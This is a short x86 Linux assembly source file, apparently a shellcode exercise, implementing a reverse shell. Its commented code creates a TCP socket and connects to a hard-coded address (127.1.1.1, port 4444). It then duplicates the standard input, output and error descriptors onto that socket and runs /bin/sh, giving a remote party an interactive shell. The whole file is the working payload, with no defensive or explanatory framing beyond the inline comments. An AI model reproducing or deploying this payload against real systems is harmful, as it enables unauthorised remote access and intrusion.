; Syscalls - cat /usr/include/i386-linux-gnu/asm/unistd_32.h
; Call numbers for socketcall -- /usr/include/linux/net.h

global _start

section .text
_start:

sock:
	; creating a socket syscall

	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx

	mov bl, 0x1

	push ecx
	push ebx
	push 0x2
	mov ecx, esp

	mov al, 0x66
	int 0x80

	mov esi, eax ; Saving socket for further use

	; creating a connect function

	; connect(socket_d, (struct sockaddr*) &sockstruct, sizeof(sockstruct))

	mov al, 0x66

	; creating a sockaddr structure

	xor ebx, ebx

	push 0x0101017f ; IP address
	push word 0x5c11 ; Port
	push word 0x2 ; AF_INET

	mov ecx, esp

	push 0x10 ; Size of sockstruct
	push ecx ; Sockstruct from stack
	push esi ; Earlier saved socket

	mov ecx, esp

	mov bl, 0x3
	int 0x80

	; piping output to our socket

	mov ebx, esi
	mov ecx, 0x3

pipe:

	mov al, 0x3f
	dec ecx
	int 0x80

	inc ecx
	loop pipe

	; execve syscall

	xor ecx, ecx
	mov edx, ecx

	push ecx
	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp

	mov al, 0xb
	int 0x80

	; Exit

	xor eax, eax
	mov al, 0x1
	int 0x80
